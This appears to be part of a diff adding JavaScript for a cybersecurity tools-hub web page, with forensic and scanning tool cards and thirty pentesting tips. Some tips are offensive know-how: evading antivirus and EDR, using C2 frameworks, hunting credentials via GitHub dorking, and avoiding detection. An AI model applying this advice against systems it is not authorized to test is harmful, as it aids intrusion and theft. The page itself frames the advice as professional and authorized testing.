+            { name: "OpenVAS", cat: "Vulnerability Scanner", icon: "orange", desc: "Full-featured vuln scanner with 50,000+ NVTs.", use: "gvm-start - Open https://localhost:9392 - Configure target - Run scan", tags: ["free","best"] },
+            { name: "Snort", cat: "IDS/IPS", icon: "pink", desc: "Network intrusion detection and prevention system.", use: "snort -i eth0 -c /etc/snort/snort.conf -A console", tags: ["free"] }
+        ]
+    },
+    forensic: {
+        title: "Forensics & Analysis Tools",
+        subtitle: "Disk forensics, memory analysis, log analysis, steganography, and incident response",
+        tools: [
+            { name: "Autopsy / Sleuth Kit", cat: "Disk Forensics", icon: "cyan", desc: "GUI digital forensics platform for disk analysis.", use: "autopsy - Create case - Add data source - Analyze files and timelines", tags: ["free","best"] },
+            { name: "Volatility", cat: "Memory Forensics", icon: "blue", desc: "Advanced memory forensics framework.", use: "volatility -f memory.dump imageinfo - volatility -f memory.dump pslist - netscan", tags: ["free","best"] },
+            { name: "Foremost", cat: "File Carving", icon: "purple", desc: "Recover deleted files from disk images.", use: "foremost -i disk.dd -o output/ - Carve all recoverable files", tags: ["free"] },
+            { name: "Binwalk", cat: "Firmware Analysis", icon: "green", desc: "Firmware analysis tool for embedded filesystems.", use: "binwalk firmware.bin - Scan firmware", tags: ["free"] },
+            { name: "ExifTool", cat: "Metadata Analysis", icon: "red", desc: "Read/write metadata for images, documents, videos.", use: "exiftool image.jpg - View all metadata", tags: ["free"] },
+            { name: "Steghide", cat: "Steganography", icon: "orange", desc: "Hide and extract data within images and audio.", use: "steghide extract -sf image.jpg -p password123", tags: ["free"] },
+            { name: "YARA", cat: "Malware Detection Rules", icon: "pink", desc: "Pattern-matching tool for malware identification.", use: "yara -s rule.yara suspicious_file.exe - Scan file with YARA rules", tags: ["free","best"] },
+            { name: "ClamAV", cat: "Antivirus Scanner", icon: "cyan", desc: "Open-source antivirus engine.", use: "clamscan -r /home/user/ - Recursively scan directory", tags: ["free"] },
+            { name: "RegRipper", cat: "Registry Analysis", icon: "blue", desc: "Windows registry forensics tool.", use: "rip.pl -r SYSTEM -f system - Parse SYSTEM hive", tags: ["free"] },
+            { name: "PDFiD", cat: "PDF Analysis", icon: "purple", desc: "Analyze PDF files for malicious content.", use: "pdfid.py suspicious.pdf - Check for suspicious objects", tags: ["free"] },
+            { name: "Rifiuti2", cat: "Recycle Bin Forensics", icon: "green", desc: "Analyze Windows Recycle Bin for deleted file info.", use: "rifiuti2 $Recycle.Bin/S-.../\$I*.dat - Parse deleted file info", tags: ["free"] }
+        ]
+    }
+};
+
+const tipsData = [
+    { num: 1, title: "Methodology First, Tools Second", desc: "Follow a structured pentest methodology (PTES, OWASP, OSSTMM). Tools are just enablers — your thinking determines success." },
+    { num: 2, title: "Always Use a VM or Dedicated Machine", desc: "Run Kali Linux or Parrot OS in a VM for isolated testing." },
+    { num: 3, title: "Master the Command Line", desc: "CLI tools are faster, scriptable, and work on remote systems via SSH." },
+    { num: 4, title: "Document as You Go", desc: "Use CherryTree, KeepNote, or Obsidian. Note every command and finding." },
+    { num: 5, title: "Recon is 60% of the Work", desc: "Spend 60% of your assessment time on recon. Better recon = better results." },
+    { num: 6, title: "Learn Network Protocols Deeply", desc: "TCP/IP, DNS, HTTP, SSL/TLS — understanding the protocol is understanding the attack surface." },
+    { num: 7, title: "Always Verify Authorization", desc: "Get written authorization. Define scope, rules of engagement, and emergency contacts." },
+    { num: 8, title: "Keep a Home Lab", desc: "Set up VMs (Windows, Linux, AD). Practice exploits safely before production." },
+    { num: 9, title: "Chain Vulnerabilities", desc: "Real attacks chain multiple low-severity issues into critical impact." },
+    { num: 10, title: "Read Exploit-DB Thoroughly", desc: "Don't just run exploits. Read the source code and understand the vulnerability." },
+    { num: 11, title: "Customize Wordlists", desc: "Use CeWL to generate target-specific wordlists for effective cracking." },
+    { num: 12, title: "Use Tmux or Screen", desc: "Manage multiple shells and sessions without losing context." },
+    { num: 13, title: "Learn Python", desc: "Python is king in cybersecurity. Automate, parse, write exploits, analyze data." },
+    { num: 14, title: "Focus on Evasion", desc: "Learn to bypass AV, AMSI, EDR, and firewalls. Critical for red teaming." },
+    { num: 15, title: "Build a Cheat Sheet", desc: "Keep a growing cheat sheet of commands and techniques." },
+    { num: 16, title: "Contribute to Community", desc: "Publish writeups, contribute to open-source, share knowledge." },
+    { num: 17, title: "Stay Current with CVEs", desc: "Follow CVE feeds, Twitter infosec, Reddit r/netsec." },
+    { num: 18, title: "Understanding > Memorization", desc: "Don't memorize blindly. Understand why each flag works." },
+    { num: 19, title: "Practice CTFs", desc: "HackTheBox, TryHackMe, VulnHub for safe real-world practice." },
+    { num: 20, title: "Write Professional Reports", desc: "A pentest is only as good as its report. Clear, actionable findings." },
+    { num: 21, title: "Use Password Managers", desc: "Bitwarden or KeePassXC for managing credentials." },
+    { num: 22, title: "Learn Active Directory Attacks", desc: "80% of enterprises use AD. Master BloodHound, Kerberoasting, DCSync." },
+    { num: 23, title: "Practice C2 Frameworks", desc: "Sliver, Covenant, Mythic. Understand C2 profiles and OPSEC." },
+    { num: 24, title: "Network Pivoting is Essential", desc: "Learn Chisel, Ligolo-ng, SSH tunneling for lateral movement." },
+    { num: 25, title: "OPSEC Matters", desc: "Use VPNs, proxy chains. Getting caught early fails the objective." },
+    { num: 26, title: "Read Tool Source Code", desc: "Understanding Metasploit, BloodHound, Mimikatz internals makes you better." },
+    { num: 27, title: "Learn Daily", desc: "30 minutes daily for reading, labs, research. Consistency beats intensity." },
+    { num: 28, title: "Master Google & GitHub Dorking", desc: "Google finds exposed data. GitHub finds credentials and API keys." },
+    { num: 29, title: "Know When to Stop", desc: "Found domain admin? Stop and report. Don't test beyond objectives." },
+    { num: 30, title: "Stay Humble and Ethical", desc: "The best hackers are professional and ethical. Reputation is everything." }
+];
+
+const container = document.getElementById('toolPagesContainer');
+const categories = ['recon','web','exploit','password','network','forensic'];
+
+categories.forEach(catId => {
+    const data = toolsData[catId];
+    let toolsHTML = '';
+    data.tools.forEach(tool => {
+        let tagsHTML = tool.tags.map(t => {
+            if(t==='free') return '<span class="tool-tag free">&#9679; Free</span>';
+            if(t==='paid') return '<span class="tool-tag paid">&#9679; Paid</span>';
+            if(t==='best') return '<span class="tool-tag best">&#9733; Best</span>';
+            return '';
+        }).join('');
+        toolsHTML += `
+            <div class="tool-card">
+                <h3>${tool.name}</h3>
+                <span class="tool-cat">${tool.cat}</span>
+                <p>${tool.desc}</p>
+                <div class="tool-use"><code>${tool.use}</code></div>
+                <div>${tagsHTML}</div>
+            </div>`;
+    });
+
+    const pageHTML = `
+        <div class="page" id="page-${catId}">
+            <div class="container">
+                <div class="page-header">
+                    <h1>${data.title}</h1>
+                    <p>${data.subtitle}</p>
+                </div>
+                <div class="search-box">
+                    <span class="search-icon">&#128270;</span>
+                    <input type="text" id="search-${catId}" placeholder="Search tools..." oninput="filterTools('${catId}')">
+                </div>
+                <div class="tools-grid" id="grid-${catId}">${toolsHTML}</div>
+                <div style="text-align:center;margin-top:2rem;">
+                    <a href="#" onclick="showPage('home')" style="color:var(--accent-cyan);text-decoration:none;">&larr; Back to Home</a>
+                </div>
+                <div class="footer">
+                    <p>&copy; 2026 <strong>CyberSec Pro</strong> — Premium Cybersecurity Tools Hub.</p>
+                </div>
+            </div>
+        </div>`;
+    container.insertAdjacentHTML('beforeend', pageHTML);
+});
+
+let tipsHTML = '';
+tipsData.forEach(tip => {
+    tipsHTML += `
+        <div class="tip-card">
+            <div class="tip-num">${tip.num}</div>
+            <h3>${tip.title}</h3>
+            <p>${tip.desc}</p>
+        </div>`;
+});
+
+const tipsPageHTML = `
+    <div class="page" id="page-tips">
+        <div class="container">
+            <div class="page-header">
+                <h1 style="background:linear-gradient(135deg,var(--accent-orange),var(--accent-cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">30 Expert Cybersecurity Tips</h1>
+                <p>Professional advice for penetration testers and security researchers</p>
+            </div>
+            <div class="search-box">
+                <span class="search-icon">&#128270;</span>
+                <input type="text" id="search-tips" placeholder="Search tips..." oninput="filterTips()">
+            </div>
+            <div class="tips-grid" id="tips-grid">${tipsHTML}</div>
+            <div style="text-align:center;margin-top:2rem;">
+                <a href="#" onclick="showPage('home')" style="color:var(--accent-cyan);text-decoration:none;">&larr; Back to Home</a>
+            </div>
+            <div class="footer">
+                <p>&copy; 2026 <strong>CyberSec Pro</strong> — Premium Cybersecurity Tools Hub.</p>
+            </div>
+        </div>
+    </div>`;
+container.insertAdjacentHTML('beforeend', tipsPageHTML);
+
+function showPage(pageId) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    const target = document.getElementById('page-'+pageId);
+    if(target) { target.classList.add('active'); window.scrollTo({top:0,behavior:'smooth'}); }
+    document.querySelectorAll('.nav-links a').forEach(a => a.classList.remove('active'));
+    const navLink = document.querySelector('.nav-links a[data-page="'+pageId+'"]');
+    if(navLink) navLink.classList.add('active');
+    document.getElementById('navLinks').classList.remove('open');
+}
+
+function toggleMenu() { document.getElementById('navLinks').classList.toggle('open'); }
+
+function filterTools(cat) {
+    const s = document.getElementById('search-'+cat).value.toLowerCase();
+    document.getElementById('grid-'+cat).querySelectorAll('.tool-card').forEach(c => {
+        c.style.display = c.textContent.toLowerCase().includes(s) ? 'block' : 'none';
+    });
+}
+
+function filterTips() {
+    const s = document.getElementById('search-tips').value.toLowerCase();
+    document.getElementById('tips-grid').querySelectorAll('.tip-card').forEach(c => {
+        c.style.display = c.textContent.toLowerCase().includes(s) ? 'block' : 'none';
+    });
+}
+
+window.showPage = showPage;
+window.toggleMenu = toggleMenu;
+window.filterTools = filterTools;
+window.filterTips = filterTips;
+</script>
+</body>
+</html>
